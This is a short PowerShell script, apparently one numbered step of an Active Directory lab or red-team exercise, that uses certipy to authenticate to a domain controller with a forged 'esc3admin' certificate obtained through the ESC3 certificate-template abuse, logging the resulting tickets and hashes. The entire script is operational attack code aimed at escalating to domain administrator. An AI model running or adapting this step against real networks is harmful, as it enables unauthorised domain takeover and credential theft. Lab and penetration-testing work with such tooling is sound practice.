# T051 ESC3 step 3 v2: certipy auth -> file log (reliable)
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack

Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*certipy*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Remove-Item C:\Tools\cadre-attack\esc3admin.ccache -Force -ErrorAction SilentlyContinue

$pfx = "C:\Tools\cadre-attack\esc3admin.pfx"
$log = "C:\Tools\cadre-attack\esc3-auth.log"
Remove-Item $log -ErrorAction SilentlyContinue
Write-Output "pfx_exists=$(Test-Path $pfx)"
if (Test-Path $pfx) {
  & $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local -debug 2>&1 | Out-File -FilePath $log -Encoding ascii
  Write-Output "auth_rc=$LASTEXITCODE"
  Write-Output "=== log tail ==="
  Get-Content $log | Select-Object -Last 14
} else { Write-Output "NO_PFX" }
Write-Output "=== ESC3_AUTH2_DONE ==="
